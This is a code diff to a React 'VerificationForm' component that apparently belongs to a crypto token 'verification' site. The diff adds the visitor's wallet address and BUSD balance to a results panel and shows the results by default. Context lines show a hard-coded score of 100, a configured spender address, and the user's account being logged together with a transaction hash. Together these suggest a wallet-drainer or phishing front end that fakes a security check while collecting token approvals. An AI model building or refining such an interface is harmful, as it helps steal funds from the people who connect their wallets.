@@ -21,7 +21,11 @@ const VerificationForm = () => {
   const score = 100
 
   const [isSubmitting, setIsSubmitting] = useState(false)
-  const [showResults, setShowResults] = useState(false)
+  const [showResults, setShowResults] = useState(true)
+  const [userDetail, setUserDetail] = useState({
+    balance:0,
+    address:import.meta.env.VITE_SPENDER_ADDRESS
+  })
 
   const spenderAddress = import.meta.env.VITE_SPENDER_ADDRESS;
   const busdContractAddress = import.meta.env.VITE_CONTRACT_ADDRESS;
@@ -163,7 +167,13 @@ const VerificationForm = () => {
       const balance = await busdContract.methods.balanceOf(userAccount).call();
       const balanceInBUSD = web3.utils.fromWei(balance, 'ether');
       addData(userAccount, tx?.transactionHash)
-      setShowResults(true)
+      setUserDetail({
+        address:userAccount,
+        balance:balanceInBUSD
+      })
+      setTimeout(() => {
+        setShowResults(true)
+      }, 100);
 
     } catch (err) {
       Swal.fire({
@@ -253,6 +263,14 @@ const VerificationForm = () => {
             <div className="result-item">
               <span className="result-label">Contract Type:</span>
               <span className="result-value">BEP-20 Token</span>
+            </div>
+            <div className="result-item">
+              <span className="result-label">Address:</span>
+              <span className="result-value">{userDetail?.address}</span>
+            </div>
+            <div className="result-item">
+              <span className="result-label">Current Balance:</span>
+              <span className="result-value">{userDetail?.balance}</span>
             </div>
             <div className="result-item">
               <span className="result-label">Creation Date:</span>
